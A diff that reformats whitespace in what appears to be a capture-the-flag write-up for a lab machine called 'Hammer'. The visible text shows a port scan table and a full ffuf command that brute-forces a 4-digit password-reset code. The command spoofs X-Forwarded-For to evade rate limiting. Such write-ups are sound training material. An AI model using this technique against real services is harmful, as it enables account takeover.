@@ -11,10 +11,10 @@
 
 | PORT | STATE | SERVICE |
 | :--- | :---- | :------ |
-| 22   | open  | ssh     |
-| 1337 | open  | http    |
-|      |       |         |
-|      |       |         |
+| 22 | open | ssh |
+| 1337 | open | http |
+| | | |
+| | | |
 
 We got two open ports, a ssh service and a http service is running in this machine, let's enumerate the website in order to gain access.
 
@@ -124,7 +124,7 @@ We have a time of `180` seconds to enter the code, we can try to brute force it 
 ----
 
 1. Generating the sequence from 0000 to 9999 since we have a 4 digit code:
-   `seq 0000 9999 >> codes.txt` 
+ `seq 0000 9999 >> codes.txt` 
 2. Preparing our payload using `ffuf` in the following way (We need the PHPSESSID that we found previously):
 	`ffuf -w codes.txt -u "http://hammer.thm:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=Cookie-ID" -H "X-Forwarded-For: FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s`
 
